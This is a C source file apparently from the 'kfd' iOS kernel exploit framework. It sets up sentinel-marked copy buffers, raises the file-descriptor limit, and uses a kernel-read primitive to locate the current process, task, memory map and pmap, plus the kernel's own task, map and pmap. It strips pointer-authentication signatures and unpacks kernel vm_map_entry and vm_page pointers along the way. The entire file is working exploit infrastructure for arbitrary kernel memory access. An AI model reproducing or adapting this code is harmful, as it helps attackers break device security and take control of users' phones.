/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "info.h"

const char copy_sentinel[16] = "p0up0u was here";
const uint64_t copy_sentinel_size = sizeof(copy_sentinel);

// vm_page
struct vm_page* vm_pages = 0;
struct vm_page* vm_page_array_beginning_addr = 0;
struct vm_page* vm_page_array_ending_addr = 0;
uint32_t vm_first_phys_ppnum = 0;

void info_init(struct kfd* kfd)
{
    /*
     * Initialize the "kfd->info.copy" substructure.
     *
     * Note that the vm_copy() in krkw_helper_grab_free_pages() makes the following assumptions:
     * - The copy size is strictly greater than "msg_ool_size_small".
     * - The src vm_object must have a copy_strategy of MEMORY_OBJECT_COPY_NONE.
     * - The dst vm_object must have a copy_strategy of MEMORY_OBJECT_COPY_SYMMETRIC.
     */
    const uint64_t msg_ool_size_small = (32 * 1024);
    kfd->info.copy.size = pages(4);
    kfd_assert(kfd->info.copy.size > msg_ool_size_small);

    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.src_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE));
    assert_mach(vm_allocate(mach_task_self(), &kfd->info.copy.dst_uaddr, kfd->info.copy.size, VM_FLAGS_ANYWHERE));
    for (uint64_t offset = pages(0); offset < kfd->info.copy.size; offset += pages(1)) {
        bcopy(copy_sentinel, (void*)(kfd->info.copy.src_uaddr + offset), copy_sentinel_size);
        bcopy(copy_sentinel, (void*)(kfd->info.copy.dst_uaddr + offset), copy_sentinel_size);
    }

    /*
     * Initialize the "kfd->info.env" substructure.
     *
     * Note that:
     * - We boost the file descriptor limit to "maxfilesperproc".
     * - We use the "vid" as a version index to get the offsets and sizes for dynamic types.
     */
    kfd->info.env.pid = getpid();

    thread_identifier_info_data_t data = {};
    thread_info_t info = (thread_info_t)(&data);
    mach_msg_type_number_t count = THREAD_IDENTIFIER_INFO_COUNT;
    assert_mach(thread_info(mach_thread_self(), THREAD_IDENTIFIER_INFO, info, &count));
    kfd->info.env.tid = data.thread_id;

    uintptr_t size1 = sizeof(kfd->info.env.maxfilesperproc);
    assert_bsd(sysctlbyname("kern.maxfilesperproc", &kfd->info.env.maxfilesperproc, &size1, NULL, 0));

    struct rlimit rlim = {
        .rlim_cur = kfd->info.env.maxfilesperproc,
        .rlim_max = kfd->info.env.maxfilesperproc
    };
    assert_bsd(setrlimit(RLIMIT_NOFILE, &rlim));
    
    kfd->info.env.ios = true;
    kfd->info.env.vid = isAvailable();

    print_i32(kfd->info.env.pid);
    print_u64(kfd->info.env.tid);
    print_u64(kfd->info.env.vid);
    print_bool(kfd->info.env.ios);
    print_u64(kfd->info.env.maxfilesperproc);
}

void info_run(struct kfd* kfd)
{
    /*
     * current_proc() and current_task()
     */
    kfd_assert(kfd->info.kernel.current_proc);
    uint64_t signed_task_kaddr = 0;
    
    signed_task_kaddr = kfd->info.kernel.current_proc + dynamic_offsetof(proc, object_size);
    kfd->info.kernel.current_task = unsign_kaddr(signed_task_kaddr);
    print_x64(kfd->info.kernel.current_proc);
    print_x64(kfd->info.kernel.current_task);

    /*
     * current_map()
     */
    uint64_t signed_map_kaddr = dynamic_kget(task, map, kfd->info.kernel.current_task);
    kfd->info.kernel.current_map = unsign_kaddr(signed_map_kaddr);
    print_x64(kfd->info.kernel.current_map);

    /*
     * current_pmap()
     */
    uint64_t signed_pmap_kaddr = dynamic_kget(vm_map, pmap, kfd->info.kernel.current_map);
    kfd->info.kernel.current_pmap = unsign_kaddr(signed_pmap_kaddr);
    print_x64(kfd->info.kernel.current_pmap);

    /*
     * current_thread() and current_uthread()
     */
    const bool find_current_thread = false;

    if (find_current_thread) {
        uint64_t thread_kaddr = dynamic_kget(task, threads_next, kfd->info.kernel.current_task);

        while (true) {
            uint64_t tid = dynamic_kget(thread, thread_id, thread_kaddr);
            if (tid == kfd->info.env.tid) {
                kfd->info.kernel.current_thread = thread_kaddr;
                kfd->info.kernel.current_uthread = thread_kaddr + dynamic_sizeof(thread);
                break;
            }

            thread_kaddr = dynamic_kget(thread, task_threads_next, thread_kaddr);
        }

        print_x64(kfd->info.kernel.current_thread);
        print_x64(kfd->info.kernel.current_uthread);
    }

    if (kfd->info.kernel.kernel_proc) {
        /*
         * kernel_proc() and kernel_task()
         */
        uint64_t signed_kernel_task = 0;
        
        signed_kernel_task = kfd->info.kernel.kernel_proc + dynamic_offsetof(proc, object_size);
        kfd->info.kernel.kernel_task = unsign_kaddr(signed_kernel_task);
        print_x64(kfd->info.kernel.kernel_proc);
        print_x64(kfd->info.kernel.kernel_task);

        /*
         * kernel_map()
         */
        uint64_t signed_map_kaddr = dynamic_kget(task, map, kfd->info.kernel.kernel_task);
        kfd->info.kernel.kernel_map = unsign_kaddr(signed_map_kaddr);
        print_x64(kfd->info.kernel.kernel_map);

        /*
         * kernel_pmap()
         */
        uint64_t signed_pmap_kaddr = dynamic_kget(vm_map, pmap, kfd->info.kernel.kernel_map);
        kfd->info.kernel.kernel_pmap = unsign_kaddr(signed_pmap_kaddr);
        print_x64(kfd->info.kernel.kernel_pmap);
    }
}

void info_free(struct kfd* kfd)
{
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.src_uaddr, kfd->info.copy.size));
    assert_mach(vm_deallocate(mach_task_self(), kfd->info.copy.dst_uaddr, kfd->info.copy.size));
}

// vm_map_entry
uint64_t VME_SUBMAP(struct vm_map_entry* entry)
{
    kfd_assert(entry->is_sub_map);
    uint64_t submap_kaddr = (entry->vme_submap << 2) | 0xf000000000000000;
    return submap_kaddr;
}

uint64_t VME_OBJECT(struct vm_map_entry* entry)
{
    kfd_assert(!entry->is_sub_map);
    kfd_assert(!entry->vme_kernel_object);
    uint64_t object_kaddr = VM_OBJECT_UNPACK(entry->vme_object);
    return object_kaddr;
}

uint64_t VME_OFFSET(struct vm_map_entry* entry)
{
    return entry->vme_offset << 12;
}

// vm_page
uint64_t vm_unpack_pointer(uint64_t packed, vm_packing_params_t params)
{
    if (!params.vmpp_base_relative) {
        int64_t addr = (int64_t)(packed);
        addr <<= __WORDSIZE - params.vmpp_bits;
        addr >>= __WORDSIZE - params.vmpp_bits - params.vmpp_shift;
        return (uint64_t)(addr);
    }
    
    if (packed) {
        return (packed << params.vmpp_shift) + params.vmpp_base;
    }
    
    return (uint64_t)(0);
}

uint64_t vm_page_unpack_ptr(uint64_t packed_page)
{
    if (packed_page >= VM_PAGE_PACKED_FROM_ARRAY) {
        packed_page &= ~VM_PAGE_PACKED_FROM_ARRAY;
        return (uint64_t)(&vm_pages[packed_page]);
    }
    
    return VM_UNPACK_POINTER(packed_page, VM_PAGE_PACKED_PTR);
}

uint32_t VM_PAGE_GET_PHYS_PAGE(struct vm_page* p)
{
    kfd_assert((p >= vm_page_array_beginning_addr) && (p < vm_page_array_ending_addr));
    return (uint32_t)((uint64_t)(p - vm_page_array_beginning_addr) + vm_first_phys_ppnum);
}
